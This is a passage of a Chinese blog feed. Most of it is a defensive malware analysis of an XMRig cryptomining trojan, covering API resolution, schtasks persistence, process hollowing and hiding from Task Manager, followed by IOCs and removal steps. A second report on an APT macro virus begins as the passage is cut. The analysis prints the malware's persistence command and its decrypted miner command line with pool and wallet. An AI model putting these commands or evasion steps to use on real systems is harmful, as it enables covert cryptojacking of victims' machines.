title="隐式加载调用函数"></a>隐式加载调用函数</h3><p>该恶意样本使用大量的隐式加载调用系统API，如下图获取函数<code>OpenMutexW</code>，就是通过隐式加载调用的。</p><ul><li><p>首先通过硬编码的方式，将要获取的函数，以及相应的模块字符串，获取到。</p></li><li><p>然后将要动态加载的DLL模块名，以及要调用的函数名作为参数，传给函数<code>GetProcAddress_402536</code>，来获取要调用的API</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570878056421.png" alt="1570878056421"></p><p><strong>函数：<code>GetProcAddress_402536</code>获取函数地址</strong></p><ul><li>该函数通过遍历<code>PEB-&gt;PEB_LDR_DATA-&gt;inMemoryOrderModuleList-&gt; LDR_MODULE()-&gt; LDR_MODULE(ntdll)-&gt;LDR_MODULE(kernel32).BaseAddress </code>，先获取到模块<code>kernel32</code>的基址。</li><li>再执行函数<code>traverse_Export_402483</code>遍历模块<code>kernel32</code>的导出表，来获取函数<code>GetModuleHandleA</code></li><li>再执行函数<code>traverse_Export_402483</code>遍历模块<code>kernel32</code>的导出表，来获取函数<code>LoadLibraryA</code></li><li>然后再用获取到的<code>GetModuleHandleA</code>去获取要获取DLL模块句柄，再用获取到的<code>LoadLibraryA</code>去加载该DLL模块句柄，就能根据传进来参数，来加载不同的DLL模块</li><li>然后再从加载的DLL模块中，获取想要获取函数的地址</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570879158336.png" alt="1570879158336"></p><ul><li><strong>函数：<code>traverse_Export_402483</code>遍历DLL模块的导出表获取函数地址</strong><ul><li>先遍历模块的PE头，获取到导出表结构，然后遍历导出表。</li><li>遍历导出表中的名称表<code>AddressOfNames</code>中的函数名去进行比较，找到想要获取的函数名。记下索引</li><li>在通过索引，去名称序号表<code>AddressOfNameOrdinals</code>中获取索引相对应的<code>NameOrdinal</code>名称序号</li><li>再根据<code>NameOrdinal</code>名称序号，去函数地址表<code>AddressOfFunction</code>中获取要获取的函数地址</li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570879877252.png" alt="1570879877252"></p><h3 id="创建互斥体"><a href="#创建互斥体" class="headerlink" title="创建互斥体"></a>创建互斥体</h3><p>创建互斥体<code>NIHILMsINERaassdaa</code></p><ul><li>首先通过隐式加载调用函数<code>OpenMutexW</code>,来判断互斥体<code>NIHILMsINERaassdaa</code>是否存在，若存在便直接退出</li><li>当互斥体<code>NIHILMsINERaassdaa</code>不存在时，便调用函数<code>CreateMutexW</code>来创建互斥体</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570880165230.png" alt="1570880165230"></p><h3 id="复制自身并创建计划任务"><a href="#复制自身并创建计划任务" class="headerlink" title="复制自身并创建计划任务"></a>复制自身并创建计划任务</h3><p>复制自身文件到<code>%AppData%\svchostx64.exe</code>，并添加计划任务每一分钟执行一次复制后的程序<code>svchostx64</code>，应征了简单行为分析==图1，图2==抓到的行为。</p><p><strong>主要行为：</strong></p><ul><li>获取路径<code>%AppData%</code>，并将其拼接为：<code>%AppData%\svchostx64.exe</code></li><li>获取当前进程的绝对路径，并与拼接出的路径进行判断，判断当前正在执行进程是否为<code>svchostx64.exe</code></li><li>若两路径不一样时，再通过函数<code>CreateFileW</code>检测<code>svhostx64</code>文件是否已经存在</li><li>若<code>svhostx64</code>文件不存在，便执行函数<code>CopyFileW</code>，将当前执行的自身文件拷贝至<code>%AppData%\svchostx64.exe</code></li><li>当复制成功后，执行函数<code>Create_Schtask_4026CC</code>，调用<code>schtasks</code>创建计划任务每分钟执行一次复制后的程序<code>svchostx64</code></li></ul><p><strong>代码如图：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570880802333.png" alt="1570880802333"></p><p><strong>函数：<code>Create_Schtask_4026CC</code>创建计划任务</strong></p><p>通过执行函数<code>ShellExecuteW</code>，调用<code>schtasks</code>来执行下面指令，来创建名为==Adasdsadas3id==的计划任务，每分钟执行一次<code>svchostx64.exe</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;SC MINUTE &#x2F;MO 1 &#x2F;F &#x2F;Create &#x2F;TN Adasdsadas3id &#x2F;tr &quot;\&quot;C:\Users\john\AppData\Roaming\svchostx64.exe\</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570880981354.png" alt="1570880981354"></p><h3 id="创建线程，防止进入休眠"><a href="#创建线程，防止进入休眠" class="headerlink" title="创建线程，防止进入休眠"></a>创建线程，防止进入休眠</h3><p>创建线程，创建死循环，每一秒执行一次函数<code>SetThreadExecutionState</code>，来通知系统当前进程正在使用，从而防止应用程序运行时进入休眠状态或关闭显示器</p><p><strong>主要行为：</strong></p><ul><li>通知系统所设置的状态应保持有效</li><li>启用离开模式</li><li>通过重置系统空闲计时器来强制系统进入工作状态。</li></ul><p><strong>代码如图：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570883758174.png" alt="1570883758174"></p><h3 id="获取区段中的PE文件"><a href="#获取区段中的PE文件" class="headerlink" title="获取区段中的PE文件"></a>获取区段中的PE文件</h3><p>该文件的<code>.plato</code>区段中存储着一个开源的矿机程序<code>XMRig.exe</code>，要想运行改程序首先要先获取到该矿机的PE文件</p><p><strong>主要行为：</strong></p><ul><li>读取当前进程，遍历节表寻找区段<code>.plato</code>，并获取相应区段的<code>.plato.Virtual Adress</code>和<code>.plato.Virtual Size</code></li><li>开辟大小为<code>.plato.Virtual Size</code>的虚拟空间，并将<code>.plato.Virtual Adress</code>中的PE文件数据保存至开辟的虚拟空间中</li></ul><p><strong>代码如图：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570885295817.png" alt="1570885295817"></p><p>既然是从内存中读取了区段<code>.plato</code>中的PE文件数据，并且并没有将其展开，可以直接dump下来，或是直接去文件中找到该区段，直接将数据拷贝下来，然后发现拷贝下来的文件是一个名为<code>XMRig.exe</code>的开源的矿机，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570885740843.png" alt="1570885740843"></p><p>该矿机可在==GitHub==直接找到其源码，链接为：<a href="https://github.com/xmrig/xmrig">https://github.com/xmrig/xmrig</a></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570885848889.png" alt="1570885848889"></p><h3 id="创建傀儡进程并监控进程"><a href="#创建傀儡进程并监控进程" class="headerlink" title="创建傀儡进程并监控进程"></a>创建傀儡进程并监控进程</h3><p>创建自身进程，并将上一步获取到的开源的矿机程序<code>XMRig.exe</code>注入该进程中并执行，其中还会监控进程，当检测到进程==任务管理器==时，便会终止傀儡进程</p><p><strong>主要行为：</strong></p><ul><li><strong>避免用户察觉</strong>，执行函数<code>JudgeSystemFree_4019E1</code>，检测操作系统当前是否处于空闲状态。当系统处于忙碌状态，将==终止傀儡进程==，也就是只在系统空闲时实施挖矿行为，来防止用户在使用时发现。</li><li>解密硬编码指令<code>CommandLine</code>，并转换为<code>unicode</code>，放入开辟好的虚拟空间中。</li><li>创建和当前进程一样的傀儡==子进程==，并将解密出来<code>CommandLine</code>作为参数传给创建的子进程来执行。</li><li>将上一步获取到的开源矿机程序<code>XMRig.exe</code>展开，==注入到创建的子进程中==。</li><li><strong>避免用户察觉</strong>，监视当前所有进程，当检测到进程==任务管理器==时，便==终止傀儡进程==，来隐藏自身防止被发现。</li></ul><p><strong>代码如图：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570888935890.png" alt="1570888935890"></p><ul><li><strong>避免用户察觉，函数<code>JudgeSystemFree_4019E1</code>，检测操作系统当前是否处于空闲状态</strong></li></ul><p>通过调用函数<code>GetLastInputInfo</code>和函数<code>CallNtPowerInformation</code>来检索系统空闲状态信息，从而来判断操作系统当前是否处于空闲状态，当操作系统属于空闲状态返回1，否则返回0，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570945418503.png" alt="1570945418503"></p><p>然后死循环，根据函数<code>JudgeSystemFree_4019E1</code>的==两次返回值==来进行判断，当系统处于==忙碌==时，便==终止傀儡进程，来避免被用户察觉==，其两次执行结果如下：</p><p>第一次执行函数<code>JudgeSystemFree_4019E1</code></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570946355225.png" alt="1570946355225"></p><p>第二次执行函数<code>JudgeSystemFree_4019E1</code></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570946510902.png" alt="1570946510902"></p><ul><li><strong>解密硬编码指令<code>CommandLine</code>，并转换为<code>unicode</code>，放入开辟好的虚拟空间中</strong></li></ul><p>然后根据第一次执行函数<code>JudgeSystemFree_4019E1</code>的返回的结果，执行不同操作，但所执行的代码实则却是一样的，都是解密一样的<code>CommandLine</code>，然后最终再将解密出来的<code>CommandLine</code>转换为<code>Unicode</code>存起来，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570947124194.png" alt="1570947124194"></p><p>解密出来的指令，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570948514232.png" alt="1570948514232"></p><ul><li><strong>创建和当前进程一样的傀儡==子进程==，并将解密出来<code>CommandLine</code>作为参数传给创建的子进程来执行</strong></li></ul><p>以没有控制台窗口并挂起的方式，来创建当前进程的子进程，并执行解密出来的<code>CommandLine</code>作为参数来执行，应征了简单行为分析==图4==抓到的行为，代码如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570949665978.png" alt="1570949665978"></p><ul><li><strong>将上一步获取到的开源矿机程序<code>XMRig.exe</code>展开，==注入到创建的子进程中==</strong><ul><li>先通过函数<code>GetThreadContext</code>，读取线程上下文</li><li>再通过函数<code>ReadProcessMemory</code>，读取<code>context-&gt;Ebx+0x8</code>的<code>AddressOfImageBase</code>字段，获取创建的傀儡子进程的==加载基址（随机基址）==</li><li>再将获取到的==加载基址（随机基址）==与前面获取到的矿机程序<code>XMRig.exe</code>的<code>ImageBase</code>进行比较。当一样时，便通过函数<code>NtUnmapViewOfSection</code>强制卸载==加载基址（随机基址）==处的模块，反之不做操作。</li><li>然后通过函数<code>VirtualAllocEx</code>，远程开辟大小为<code>XMRig.exe</code>的<code>sizeofImage</code>，基址为其<code>ImageBase</code>的==虚拟空间==</li><li>然后往远程开辟的==虚拟空间==中，写入文件<code>XMRig.exe</code>的<code>DOS</code>头，并将各个区段==展开==</li><li>再修复傀儡进程的==加载基址（随机基址）==，并通过函数<code>SetThreadContext</code>，设置线程上下文，修改傀儡进程的入口点地址为<code>XMRig.exe</code>的<code>AddressOfEntryPoint</code></li><li>最后通过函数<code>NtAlertResumeThread</code>，恢复进程，结束挂起</li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570951469149.png" alt="1570951469149"></p><ul><li><strong>避免用户察觉，监视当前所有进程，当检测到进程==任务管理器==时，便终止傀儡进程</strong></li></ul><p>创建了两个死循环，来==<strong>避免用户察觉</strong>==。</p><ul><li><p>其中第一个死循环，前面分析<code>JudgeSystemFree_4019E1</code>中提到过，来判断系统是否处于忙碌，当处于==忙碌时==，便终止傀儡进程，来避免用户察觉。不过这里还有一个检测函数<code>traverse_Proc_4014EF</code>，遍历进程，当检测到进程名为<code>Taskmgr</code>便返回1，退出循环，终止傀儡进程。</p></li><li><p>第二个死循环，不断执行检测函数<code>traverse_Proc_4014EF</code>监控进程。当检测到进程<code>Taskmgr</code>，便一直睡眠，直到检测不到进程<code>Taskmgr</code>时，便从新执行当前函数<code>inject_4010C5</code>，创建傀儡进程，注入矿机。</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570951668325.png" alt="1570951668325"></p><ul><li><ul><li>函数<code>traverse_Proc_4014EF</code></li></ul></li></ul><p>快照系统中的所有进程，然后遍历所有进程，比较进程名，当遇到<code>Taskmgr</code>，便返回1，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570953268202.png" alt="1570953268202"></p><h2 id="分析矿机程序"><a href="#分析矿机程序" class="headerlink" title="分析矿机程序"></a>分析矿机程序</h2><p>前面分析也有提到，<code>dump.exe</code>的最后一个区段<code>.plato</code>中包含一个矿机程序<code>XMRig.exe</code>，并且该矿机程序<code>XMRig.exe</code>是开源的，可以直接在网上找到，并下载，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570954719719.png" alt="1570954719719"></p><p>其中我们比较关注的就是傀儡进程，执行的指令对应的是什么意思，这里我们可以在<code>GitHub</code>上查看该矿机的帮助手册<code>README</code>，链接： <a href="https://github.com/xmrig/xmrig">https://github.com/xmrig/xmrig</a> ，通过帮助手册中的<code>Options</code>，查看该框架的指令，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">-a, --algo&#x3D;ALGO               specify the algorithm to use</span><br><span class="line">                                cn&#x2F;r, cn&#x2F;2, cn&#x2F;1, cn&#x2F;0, cn&#x2F;double, cn&#x2F;half, cn&#x2F;fast,</span><br><span class="line">                                cn&#x2F;rwz, cn&#x2F;zls, cn&#x2F;xao, cn&#x2F;rto, cn&#x2F;gpu,</span><br><span class="line">                                cn-lite&#x2F;1,</span><br><span class="line">                                cn-heavy&#x2F;xhv, cn-heavy&#x2F;tube, cn-heavy&#x2F;0,</span><br><span class="line">                                cn-pico,</span><br><span class="line">                                rx&#x2F;wow, rx&#x2F;loki</span><br><span class="line">-o, --url&#x3D;URL                 URL of mining server</span><br><span class="line">-O, --userpass&#x3D;U:P            username:password pair for mining server</span><br><span class="line">-u, --user&#x3D;USERNAME           username for mining server</span><br><span class="line">-p, --pass&#x3D;PASSWORD           password for mining server</span><br><span class="line">    --rig-id&#x3D;ID               rig identifier for pool-side statistics (needs pool support)</span><br><span class="line">-t, --threads&#x3D;N               number of miner threads</span><br><span class="line">-v, --av&#x3D;N                    algorithm variation, 0 auto select</span><br><span class="line">-k, --keepalive               send keepalived packet for prevent timeout (needs pool support)</span><br><span class="line">    --nicehash                enable nicehash.com support</span><br><span class="line">    --tls                     enable SSL&#x2F;TLS support (needs pool support)</span><br><span class="line">    --tls-fingerprint&#x3D;F       pool TLS certificate fingerprint, if set enable strict certificate pinning</span><br><span class="line">    --daemon                  use daemon RPC instead of pool for solo mining</span><br><span class="line">    --daemon-poll-interval&#x3D;N  daemon poll interval in milliseconds (default: 1000)</span><br><span class="line">-r, --retries&#x3D;N               number of times to retry before switch to backup server (default: 5)</span><br><span class="line">-R, --retry-pause&#x3D;N           time to pause between retries (default: 5)</span><br><span class="line">    --cpu-affinity            set process affinity to CPU core(s), mask 0x3 for cores 0 and 1</span><br><span class="line">    --cpu-priority            set process priority (0 idle, 2 normal to 5 highest)</span><br><span class="line">    --no-huge-pages           disable huge pages support</span><br><span class="line">    --no-color                disable colored output</span><br><span class="line">    --donate-level&#x3D;N          donate level, default 5% (5 minutes in 100 minutes)</span><br><span class="line">    --user-agent              set custom user-agent string for pool</span><br><span class="line">-B, --background              run the miner in the background</span><br><span class="line">-c, --config&#x3D;FILE             load a JSON-format configuration file</span><br><span class="line">-l, --log-file&#x3D;FILE           log all output to a file</span><br><span class="line">    --asm&#x3D;ASM                 ASM optimizations, possible values: auto, none, intel, ryzen, bulldozer.</span><br><span class="line">    --print-time&#x3D;N            print hashrate report every N seconds</span><br><span class="line">    --api-worker-id&#x3D;ID        custom worker-id for API</span><br><span class="line">    --api-id&#x3D;ID               custom instance ID for API</span><br><span class="line">    --http-enabled            enable HTTP API</span><br><span class="line">    --http-host&#x3D;HOST          bind host for HTTP API (default: 127.0.0.1)</span><br><span class="line">    --http-port&#x3D;N             bind port for HTTP API</span><br><span class="line">    --http-access-token&#x3D;T     access token for HTTP API</span><br><span class="line">    --http-no-restricted      enable full remote access to HTTP API (only if access token set)</span><br><span class="line">    --randomx-init&#x3D;N          threads count to initialize RandomX dataset</span><br><span class="line">    --randomx-no-numa         disable NUMA support for RandomX</span><br><span class="line">    --export-topology         export hwloc topology to a XML file and exit</span><br><span class="line">    --dry-run                 test configuration and exit</span><br><span class="line">-h, --help                    display this help and exit</span><br><span class="line">-V, --version                 output version information and exit</span><br></pre></td></tr></table></figure><p>然而该样本执行的参数为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-o monerohash.com:3333 -u 4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQni58KYZqH43YSDeqY -p x -k --donate-level&#x3D;1 -t 3</span><br></pre></td></tr></table></figure><p>其各项参数解析如下表：</p><table><thead><tr><th>Options</th><th>Meaning</th><th>Value</th></tr></thead><tbody><tr><td>- o</td><td>URL of mining server（矿池）</td><td>monerohash.com:3333</td></tr><tr><td>- u</td><td>username for mining server（用户名）</td><td>4BrL51JCc9NGQ71kW….</td></tr><tr><td>- p</td><td>password for mining server（密码）</td><td>x</td></tr><tr><td>- k</td><td>send keepalived packet for prevent timeout （防止超时）</td><td>NULL</td></tr><tr><td>-donate-level</td><td>Default donation 5% (5 minutes in 100 minutes) can be reduced to 1%（捐赠比例）</td><td>1</td></tr><tr><td>- t</td><td>number of miner threads（线程数量）</td><td>3</td></tr></tbody></table><p>其中矿池：<code>monerohash.com:3333</code>，为门罗币的矿池。</p><p>也就说明该样本通过创建傀儡进程，注入这个开源的矿机程序<code>XMRig.exe</code>，连接到（门罗币）的矿池，用病毒作者自己的用户名密码登陆上，来进行挖矿来获利的。</p><h1 id="样本溯源"><a href="#样本溯源" class="headerlink" title="样本溯源"></a>样本溯源</h1><h2 id="文件信息"><a href="#文件信息" class="headerlink" title="文件信息"></a>文件信息</h2><table><thead><tr><th>FileName</th><th>FileSize</th><th>MD5</th></tr></thead><tbody><tr><td>d48ab2e921f5c725672fce16135d1f09.vir</td><td><strong>468480 bytes</strong></td><td><strong>D48AB2E921F5C725672FCE16135D1F09</strong></td></tr><tr><td><strong>svchostx64.exe</strong></td><td><strong>468480 bytes</strong></td><td><strong>D48AB2E921F5C725672FCE16135D1F09</strong></td></tr><tr><td><strong>XMRig.exe</strong></td><td><strong>283136 bytes</strong></td><td><strong>C131DE679C5B230CDD3415A47F53ED10</strong></td></tr></tbody></table><h2 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息"></a>网络信息</h2><p><strong>矿池URL为：</strong><code>monerohash.com:3333</code></p><table><thead><tr><th>矿池的 IP</th><th>服务器所在地</th></tr></thead><tbody><tr><td>107.191.99.221</td><td>美国 纽约</td></tr><tr><td>107.191.99.95</td><td>美国 纽约</td></tr></tbody></table><h2 id="IOCs"><a href="#IOCs" class="headerlink" title="IOCs"></a>IOCs</h2><table><thead><tr><th>互斥体</th><th>NIHILMsINERaassdaa</th></tr></thead><tbody><tr><td><strong>释放文件名</strong></td><td><strong>svchostx64.exe</strong></td></tr><tr><td><strong>计划任务名</strong></td><td><strong>Adasdsadas3id</strong></td></tr><tr><td><strong>特定区段名</strong></td><td><strong>.plato</strong></td></tr><tr><td><strong>矿池</strong></td><td><strong>monerohash.com:3333</strong></td></tr></tbody></table><h1 id="查杀方案"><a href="#查杀方案" class="headerlink" title="查杀方案"></a>查杀方案</h1><ul><li><strong>1.删除计划任务</strong></li></ul><p>由于该样本只在复制自身之后才会创建计划任务，因此我们可以直接删除该计划任务。</p><blockquote><p>打开<code>CMD</code>，执行指令<code>schtasks /delete /TN Adasdsadas3id /F</code>，删除计划任务。</p></blockquote><ul><li><strong>2.将文件MD5加入杀软黑名单</strong></li></ul><p>由于该样本是复制自身到<code>%AppData%</code>目录下的<code>svhostx64.exe</code>，两文件的MD5值是一样的，并且该恶意样本是通过创建傀儡进程将自身文件中的矿机程序注入其中，因此只需要删除该文文件，便能实现查杀。</p><blockquote><p>重启电脑，将恶意样本的<code>MD5</code>值**<code>D48AB2E921F5C725672FCE16135D1F09</code>**，加入杀软的应用黑名单中，进行一次全盘查杀</p></blockquote><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote><p>该挖矿木马通过创建傀儡进程，将自身最后一个区段存储的开源矿机程序注入到傀儡进程中，从而进行挖矿，使攻击者利用受害者的主机赚取加密数字货币来获利。并且该挖矿木马还会检测当前系统是否空闲，是否启用进程管理器等操作来隐蔽自身，避免用户察觉。长期被感染的主机会大大降低系统硬件的寿命。因此大家应不要从不正规的网址下载文件，或是从不确定来源的地方接收文件，安装杀软，定期杀毒，做好防范工作。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 样本分析报告 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 奇兵计划 </tag>
            
            <tag> 样本分析报告 </tag>
            
            <tag> 挖矿 </tag>
            
            <tag> XMRig矿机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>宏病毒_APT分析报告</title>
      <link href="2019/10/10/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/"/>
      <url>2019/10/10/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/</url>
      
        <content type="html"><![CDATA[<center><font size = 8><b>05 APT宏病毒分析报告</b></font></center><h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th align="center">样本名称</th><th align="center"><strong>Order__679873892.xls</strong></th></tr></thead><tbody><tr><td align="center"><strong>样本类型</strong></td><td align="center"><strong>宏病毒、远控木马</strong></td></tr><tr><td align="center"><strong>样本大小</strong></td><td align="center"><strong>40.5 KB (41,472 字节)</strong></td></tr><tr><td align="center"><strong>MD5</strong></td><td align="center"><strong>2A8A7254D6A2D75BC55F27F732C97DCC</strong></td></tr></tbody></table><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>该样本最终实现执行一个远控程序，样本通过宏代码访问网址中的JS代码，调用mshta执行JS代码解析出的VBS代码。其中多重混淆，并且全程都是以无文件方式执行的，从指定URL上获取两端PE数据流，通过反射加载来创建傀儡进程执行远控程序，在一定程度上可以逃避杀软的查杀，可见该样本的执行过程十分隐蔽，技术手段高超。</p></blockquote><h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/05_%E5%AE%8F%E7%97%85%E6%AF%92.png" alt="05_宏病毒"></p><h1 id="0x01-样本详细分析"><a href="#0x01-样本详细分析" class="headerlink" title="0x01 样本详细分析"></a>0x01 样本详细分析</h1><h2 id="查看宏"><a href="#查看宏" class="headerlink" 